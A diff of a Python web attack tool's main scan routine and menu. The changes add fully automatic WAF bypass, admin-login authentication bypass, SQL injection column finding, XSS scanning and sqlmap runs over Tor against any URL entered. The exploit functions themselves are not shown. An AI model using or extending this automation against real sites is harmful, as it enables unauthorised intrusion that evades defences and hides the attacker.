     print(f"{GREEN}Target URL: {url}{NC}")
     print(f"{GREEN}Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
-    print(f"{GREEN}Mode: Full Automatic Scan{NC}")
+    print(f"{GREEN}Mode: FULLY AUTOMATIC v2.0{NC}")
     print()
-    
-    # Ask for Tor usage
-    use_tor = input(f"{YELLOW}[?] Use Tor for anonymous scanning? (y/n): {NC}").lower().strip() == 'y'
-    
-    if use_tor:
-        if not check_tor_status():
-            print_warn("Tor not running! Attempting to start...")
-            start_tor()
-        check_proxychains()
-        if TOR_RUNNING:
-            print_good("Tor is active - your scans are anonymous!")
-        else:
-            print_warn("Tor failed to start - continuing without anonymity")
-    
     check_install_requirements()
-    
     print_section(" Target Status ")
     status = is_url_alive(url)
-    if status:
-        print_good(f"Target is alive (HTTP {status})")
-    else:
+    if not status:
         print_error("Target is not reachable!")
         return
-    
-    waf_result = detect_waf(url)
-    detect_technologies(url)
+    print_good(f"Target is alive (HTTP {status})")
+    waf_detected = detect_waf(url)
+    bypass_method = None
+    if waf_detected:
+        print_info(f"WAF detected: {', '.join(waf_detected)}")
+        print_info("Running auto WAF bypass...")
+        bypass_success, bypass_method = auto_waf_bypass(url)
+        if bypass_success:
+            print_good(f"WAF bypassed using: {bypass_method}")
+        else:
+            print_warn("Continuing without WAF bypass")
+    techs = detect_technologies(url)
     analyze_headers(url)
-    check_robots_sitemap(url)
-    
     if url.startswith("https"):
         check_ssl(url)
-    
-    if waf_result:
-        waf_bypass_scan(url)
-    
+    check_robots_sitemap(url)
+    cms_type = auto_cms_scan(url)
+    admin_panels = find_admin_panel(url)
+    if admin_panels:
+        for admin_url, _ in admin_panels[:3]:
+            if "login" in admin_url.lower() or "auth" in admin_url.lower() or "Auth Required" in _:
+                bypass_found, bypass_url, bypass_creds = auto_auth_bypass(admin_url)
+                if bypass_found:
+                    print_good(f"Auth bypass working for {admin_url}")
     crawled_urls = web_crawl(url)
     fuzz_directories(url)
-    max_cols, vuln_params = detect_columns(url)
-    sqli_results = sql_injection_scan(url)
-    xss_results = xss_scan(url)
-    scan_ports(url)
-    
+    open_ports = scan_ports(url)
+    sqli_results, vuln_cols = auto_sqli_scan(url)
+    xss_results = xss_scan_fixed(url)
     if "?" in url:
         print_section(" SQLMap Integration ")
-        print(f"{YELLOW}Options:{NC}")
-        print(f"  {GREEN}[1]{NC} Run sqlmap (standard)")
-        print(f"  {GREEN}[2]{NC} Run sqlmap with Tor + Anti-Reset (Recommended)")
-        print(f"  {GREEN}[3]{NC} Skip sqlmap")
-        
-        sqlmap_choice = input(f"{YELLOW}[?] Select option: {NC}").strip()
-        
-        if sqlmap_choice == "1":
-            run_sqlmap_automation(url)
-        elif sqlmap_choice == "2":
-            run_sqlmap_with_tor(url)
-    
+        print(f"{YELLOW}Run sqlmap automatically?{NC}")
+        print(f"  {GREEN}[1]{NC} Yes - with WAF bypass + Tor")
+        print(f"  {GREEN}[2]{NC} Yes - standard mode")
+        print(f"  {GREEN}[3]{NC} Skip")
+        choice = input(f"{YELLOW}[?] Option (1-3): {NC}").strip()
+        if choice == "1":
+            auto_sqlmap_with_bypass(url)
+        elif choice == "2":
+            # Run standard sqlmap
+            auto_sqlmap_with_bypass(url)
+    print_section(" Nikto Integration ")
+    print(f"{YELLOW}Run nikto web scanner?{NC}")
+    print(f"  {GREEN}[1]{NC} Yes")
+    print(f"  {GREEN}[2]{NC} Skip")
+    if input(f"{YELLOW}[?] Option (1-2): {NC}").strip() == "1":
+        auto_nikto_scan(url)
     print_section(" Scan Summary ")
     print(f"  Target: {url}")
     print(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"  Tor Used: {'Yes' if use_tor and TOR_RUNNING else 'No'}")
-    print(f"  WAF Detected: {', '.join(waf_result) if waf_result else 'None'}")
-    print(f"  SQL Injection: {len(sqli_results) if sqli_results else 0} vulnerable parameters")
-    print(f"  XSS: {len(xss_results) if xss_results else 0} vulnerable parameters")
-    print(f"  Columns Found: {max_cols if max_cols else 'N/A'}")
-    print(f"  URLs Crawled: {len(crawled_urls)}")
+    print(f"  CMS Detected: {cms_type if cms_type else 'None'}")
+    print(f"  WAF Detected: {', '.join(waf_detected) if waf_detected else 'None'}")
+    print(f"  WAF Bypassed: {bypass_method if bypass_method else 'N/A'}")
+    print(f"  Admin Panels: {len(admin_panels) if admin_panels else 0}")
+    print(f"  SQL Injection: {len(sqli_results) if sqli_results else 0} vulns")
+    print(f"  Vulnerable Columns: {vuln_cols if vuln_cols else 'Not found'}")
+    print(f"  XSS: {len(xss_results) if xss_results else 0} vulns")
+    print(f"  Open Ports: {len(open_ports) if open_ports else 0}")
+    print(f"  URLs Crawled: {len(crawled_urls) if crawled_urls else 0}")
     print()
-    print(f"{GREEN}Scan completed successfully!{NC}")
+    print(f"{GREEN}{BOLD}Scan completed successfully!{NC}")
 
 # ============================================================
-# INTERACTIVE MENU (Modified with Tor option)
+# INTERACTIVE MENU
 # ============================================================
 
 def interactive_menu():
     while True:
         show_banner()
         print(f"{CYAN}Options:{NC}")
-        print(f"  {GREEN}[1]{NC} Full Scan (All Modules)")
-        print(f"  {GREEN}[2]{NC} WAF Detection Only")
-        print(f"  {GREEN}[3]{NC} WAF Bypass Test")
-        print(f"  {GREEN}[4]{NC} SQL Injection Scan")
-        print(f"  {GREEN}[5]{NC} XSS Scan")
-        print(f"  {GREEN}[6]{NC} Column Detection")
+        print(f"  {GREEN}[1]{NC} FULLY AUTOMATIC SCAN (All Modules)")
+        print(f"  {GREEN}[2]{NC} WAF Detection + Auto Bypass")
+        print(f"  {GREEN}[3]{NC} SQL Injection (Auto + Column Detect)")
+        print(f"  {GREEN}[4]{NC} XSS Scan (Fixed)")
+        print(f"  {GREEN}[5]{NC} CMS Detection + WordPress Auto Scan")
+        print(f"  {GREEN}[6]{NC} Admin Panel Finder + Auth Bypass")
         print(f"  {GREEN}[7]{NC} Web Crawling")
         print(f"  {GREEN}[8]{NC} Port Scanning")
         print(f"  {GREEN}[9]{NC} Directory Fuzzing")
         print(f"  {GREEN}[10]{NC} Header Analysis")
-        print(f"  {GREEN}[11]{NC} Technology Detection")
-        print(f"  {GREEN}[12]{NC} SSL/TLS Check")
-        print(f"  {GREEN}[13]{NC} Robots.txt & Sitemap Check")
-        print(f"  {GREEN}[14]{NC} SQLMap Automation (Standard)")
-        print(f"  {GREEN}[15]{NC} SQLMap with Tor + Anti-Reset")
-        print(f"  {GREEN}[16]{NC} Check Tor Status")
+        print(f"  {GREEN}[11]{NC} SSL/TLS Check (Fixed)")
+        print(f"  {GREEN}[12]{NC} SQLMap WAF Bypass Edition")
+        print(f"  {GREEN}[13]{NC} Nikto Scanner")
+        print(f"  {GREEN}[14]{NC} Vulnerable Column Finder")
         print(f"  {RED}[0]{NC} Exit")
         print()
-        
-        choice = input(f"{YELLOW}[?] Select option (0-16): {NC}").strip()
-        
+        choice = input(f"{YELLOW}[?] Option (0-14): {NC}").strip()
         if choice == "0":
             print(f"{GREEN}Exiting...{NC}")
             sys.exit(0)
-        
-        url = input(f"{YELLOW}[?] Enter target URL (e.g., http://example.com/page.php?id=1): {NC}").strip()
+        url = input(f"{YELLOW}[?] Enter target URL: {NC}").strip()
         if not url:
             print_error("URL is required!")
             continue
-        
         if not url.startswith("http"):
             url = "http://" + url
-        
         show_banner()
         print(f"{GREEN}Target: {url}{NC}\n")
-        
         try:
             if choice == "1":
-                run_full_scan(url)
+                run_auto_scan(url)
             elif choice == "2":
                 check_install_requirements()
                 detect_waf(url)
+                auto_waf_bypass(url)
             elif choice == "3":
-                waf_bypass_scan(url)
+                auto_sqli_scan(url)
             elif choice == "4":
-                sql_injection_scan(url)
+                xss_scan_fixed(url)
             elif choice == "5":
-                xss_scan(url)
+                auto_cms_scan(url)
             elif choice == "6":
-                detect_columns(url)
+                admin_panels = find_admin_panel(url)
+                if admin_panels:
+                    for admin_url, _ in admin_panels[:3]:
+                        if "login" in admin_url.lower() or "Auth Required" in _:
+                            auto_auth_bypass(admin_url)
             elif choice == "7":
                 web_crawl(url)
             elif choice == "8":
@@ -1610,30 +1690,21 @@ def interactive_menu():
             elif choice == "10":
                 analyze_headers(url)
             elif choice == "11":
-                detect_technologies(url)
-            elif choice == "12":
                 check_ssl(url)
+            elif choice == "12":
+                auto_sqlmap_with_bypass(url)
             elif choice == "13":
-                check_robots_sitemap(url)
+                auto_nikto_scan(url)
             elif choice == "14":
-                run_sqlmap_automation(url)
-            elif choice == "15":
-                run_sqlmap_with_tor(url)
-            elif choice == "16":
-                check_tor_status()
-                check_proxychains()
-                if TOR_RUNNING:
-                    print_good("Tor is RUNNING")
-                else:
-                    print_warn("Tor is NOT RUNNING")
-                    print_info("Start with: systemctl start tor")
+                max_cols, vuln_params = detect_columns_fixed(url)
+                if max_cols:
+                    find_vulnerable_columns(url, max_cols, vuln_params)
             else:
                 print_error("Invalid option!")
         except KeyboardInterrupt:
             print(f"\n{YELLOW}Scan interrupted by user{NC}")
         except Exception as e:
             print_error(f"Error: {str(e)}")
-        
         print(f"\n{YELLOW}Press Enter to continue...{NC}", end="")
         input()
 
@@ -1644,12 +1715,11 @@ def interactive_menu():
 def main():
     try:
         signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
-        
         if len(sys.argv) > 1:
             url = sys.argv[1]
             if not url.startswith("http"):
                 url = "http://" + url
-            run_full_scan(url)
+            run_auto_scan(url)
         else:
             interactive_menu()
     except KeyboardInterrupt:
